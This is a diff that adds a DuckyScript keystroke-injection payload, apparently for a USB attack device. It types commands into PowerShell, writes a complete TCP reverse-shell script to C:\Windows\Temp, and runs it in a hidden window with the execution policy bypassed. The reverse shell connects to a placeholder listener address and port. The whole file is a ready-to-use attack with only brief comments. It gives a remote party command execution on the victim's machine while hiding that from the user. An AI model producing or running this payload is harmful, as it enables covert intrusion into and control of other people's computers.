@@ -1,0 +1,28 @@
+DELAY 200
+REM Opens Run Command dialog
+WINDOWS R
+DELAY 500
+
+REM Opens PowerShell
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Writes the reverse shell command to a temporary file
+STRING $script = '$client=New-Object System.Net.Sockets.TCPClient("[[TCP_LISTENER_ADDRESS]]",[[TCP_LISTENER_PORT]]);$stream=$client.GetStream();$writer=New-Object System.IO.StreamWriter($stream);$reader=New-Object System.IO.StreamReader($stream);$writer.AutoFlush=$true;$writer.WriteLine("Connection established to Windows PowerShell.");while($true){try{$command=$reader.ReadLine();if($command -eq "exit"){break};$output=Invoke-Expression $command 2>&1|Out-String;$writer.WriteLine($output);$writer.Flush()}catch{$writer.WriteLine("Error executing command: $_");$writer.Flush()}};$writer.Close();$reader.Close();$stream.Close();$client.Close();'
+ENTER
+DELAY 200
+
+STRING $script | Out-File -FilePath C:\Windows\Temp\reverseshell.ps1
+ENTER
+DELAY 200
+
+REM Runs the script in a hidden PowerShell process
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\reverseshell.ps1'
+ENTER
+DELAY 500
+
+REM Exits the initial PowerShell window
+STRING exit
+ENTER
+
